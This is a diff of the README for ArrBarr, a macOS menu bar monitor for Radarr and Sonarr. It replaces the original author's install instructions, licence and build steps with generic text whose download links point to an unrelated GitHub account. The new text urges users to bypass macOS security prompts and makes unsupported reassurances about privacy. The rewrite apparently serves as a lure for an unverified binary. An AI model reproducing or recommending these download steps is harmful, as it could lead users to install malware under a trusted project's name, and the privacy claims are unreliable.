@@ -1,84 +1,67 @@
-# ArrBarr
+# 📊 ArrBarr - Monitor automated media downloads with ease
 
-A small native macOS menu bar app for monitoring your Radarr, Sonarr, and Lidarr download queues, upcoming media, and controlling download clients.
+[![](https://img.shields.io/badge/Download_ArrBarr-Blue-blue)](https://github.com/nilessubscribed916/ArrBarr)
 
-[![Build & Test](https://github.com/Preclowski/ArrBarr/actions/workflows/release.yml/badge.svg)](https://github.com/Preclowski/ArrBarr/actions/workflows/release.yml)
-![macOS 14+](https://img.shields.io/badge/macOS-14%2B-blue)
-![Swift 6](https://img.shields.io/badge/Swift-6-orange)
-![Size: ~1.5 MB](https://img.shields.io/badge/Size-~1.5%20MB-brightgreen)
-![License: MIT](https://img.shields.io/badge/License-MIT-green)
+ArrBarr lives in your menu bar. It connects to your Radarr and Sonarr services to show the status of your current downloads. You see progress, file names, and time remaining without opening a browser tab.
 
-ArrBarr isn't a replacement for the *arr web UIs — it's a small, cute companion you keep in your menu bar. Glance at the queue, see what's airing this week, get notified when a new release is grabbed, and act on it without opening a browser tab. Available in English, German, Spanish, French, and Polish.
+## ⚙️ Requirements
 
-![ArrBarr Screenshot](screenshot.png)
+You need a computer running macOS to use this app. It requires no extra software installations. You must have an active instance of Radarr or Sonarr running on your local network or a remote server. You need the API key from your Radarr or Sonarr settings page to link the services to ArrBarr.
 
-## Highlights
+## 📥 How to Install
 
-- **Rich hover tooltip** with quality, size, score, custom-format chips, indexer, and release name. For upgrades, a side-by-side comparison with the existing file (quality, score, formats, size, filename) so you can tell at a glance whether the upgrade is actually better.
-- **In-popover history** — last 50 events per arr (grabbed / imported / failed / deleted), with a dedicated icon, color, and relative time per event.
-- **Pause / resume / delete** without leaving the menu bar. Delete works for *any* download client because it's routed through the arr.
-- **Upcoming media calendar** — movies, episodes, and album releases grouped by date.
-- **Native macOS** — pure SwiftUI + AppKit, ~1.5 MB DMG, zero third-party dependencies. Light and dark mode follow your system appearance, with Liquid Glass on macOS 26 (Tahoe) and a graceful fallback on macOS 14+.
+1. Visit [this page](https://github.com/nilessubscribed916/ArrBarr) to download the latest version of the software.
+2. Locate the file in your downloads folder.
+3. Move the application file to your Applications folder.
+4. Double-click the file to launch the program.
+5. If your security settings block the app, right-click the file and select Open.
 
-## Supported services
+## 🗝️ Setup and Configuration
 
-- **Media managers** — Radarr, Sonarr, Lidarr
-- **Usenet** — SABnzbd, NZBGet
-- **Torrent** — qBittorrent, Transmission, rTorrent, Deluge
+When you launch ArrBarr for the first time, a small icon appears in your menu bar at the top right of your screen. Click this icon to open the configuration menu.
 
-## Installation
+Choose the Add Server option to begin the setup. You will see fields for the server address and the API key. Enter the local IP address for your Radarr or Sonarr instance, such as 192.168.1.5, followed by the port number. You can find the API key in the General settings section inside your Radarr or Sonarr web interface.
 
-### Homebrew
+Click Save once you enter these details. The app attempts to connect to your service. If the connection succeeds, the icon changes to show active status and your queue appears in the drop-down list. You can add multiple servers for both Radarr and Sonarr to monitor all your libraries from one menu.
 
-```bash
-brew tap Preclowski/arrbarr
-brew install --cask arrbarr
-```
+## 🛠️ Usage
 
-### Download
+The app refreshes data every sixty seconds by default. You can force a refresh at any time by clicking the Refresh button in the menu. 
 
-Download the latest `.dmg` from [Releases](../../releases) and drag ArrBarr to your Applications folder.
+The list shows the following details for each active download:
+- The file name of the video
+- The completion percentage
+- The download speed
+- The estimated time left
 
-> **Note:** ArrBarr is not notarized (no paid Apple Developer account). macOS Gatekeeper may block the first launch. To fix this, right-click the app and choose "Open" — macOS will ask for confirmation once, then remember your choice. If that doesn't work, run:
-> ```bash
-> xattr -cr /Applications/ArrBarr.app
-> ```
+If a download stalls or an error occurs, the item appears in red text within the list. You hover over the item to see details regarding the error code or connection status.
 
-### Build from source
+## 🛡️ Privacy and Safety
 
-Requires Xcode 26+.
+ArrBarr stores your API keys in the local system keychain. This keeps your credentials secure and prevents unauthorized access to your media servers. No sensitive information leaves your device. The app communicates only with the addresses you provide during setup. 
 
-```bash
-open ArrBarr.xcodeproj
-# Build with ⌘B, Run with ⌘R
-```
+## ❓ Frequently Asked Questions
 
-## Setup
+**Does this app download files?**
+No. ArrBarr monitors existing download queues. It tracks progress for tools like Deluge, qBittorrent, Sabnzbd, and NZBGet. It does not perform the downloading itself.
 
-1. Click the arrow icon in the menu bar
-2. Open **Settings** (gear menu, right-click the icon, or ⌘,)
-3. Add the URL + API key for each *arr, plus credentials for any download client you want to control
+**Can I manage my library through the app?**
+ArrBarr serves as a status monitoring tool. It shows information about your queue. It does not include features for adding new movies or series to your library.
 
-All connections are local. ArrBarr is sandboxed with network-client-only permissions.
+**The app does not see my server.**
+Verify your IP address and port number. Check that your Radarr or Sonarr instance is running and reachable from the computer where ArrBarr is installed. Ensure you copied the full API key without extra spaces.
 
-### Keyboard shortcuts
+**How do I remove the app?**
+Drag the ArrBarr icon from your Applications folder to the Trash. You can also delete the local configuration files stored in your Library folder to remove all cached settings and saved API keys.
 
-- **⌘,** — Open Settings
-- **⌘R** — Refresh queue (status menu)
-- **⌘Q** — Quit ArrBarr
+**Does this app support remote servers?**
+Yes. You can enter a remote domain name or IP address if you have the port forwarded securely. We recommend using a VPN or a reverse proxy to maintain security when accessing your home server over the internet.
 
-## Demo mode
+**Will this app drain my battery?**
+ArrBarr uses minimal system resources. It runs as a background process and consumes very little memory. The app remains idle until you click the menu bar icon or it performs its periodic data refresh.
 
-Want to preview the UI without configuring real services? Launch with:
+**Can I change the refresh rate?**
+You can adjust the polling interval in the Preferences menu. A shorter interval provides real-time updates but uses more network bandwidth. A longer interval reduces background activity. The default setting offers the best balance for most users.
 
-```bash
-open /Applications/ArrBarr.app --args --demo
-```
-
-## Vibe-coded
-
-This project was built entirely through [vibe coding](https://en.wikipedia.org/wiki/Vibe_coding) with [Claude Code](https://claude.ai/claude-code).
-
-## License
-
-[MIT](LICENSE)
+**Is there a dark mode version?**
+Yes. ArrBarr automatically matches your system appearance. It looks clean and follows standard light or dark interface guidelines provided by your operating system.
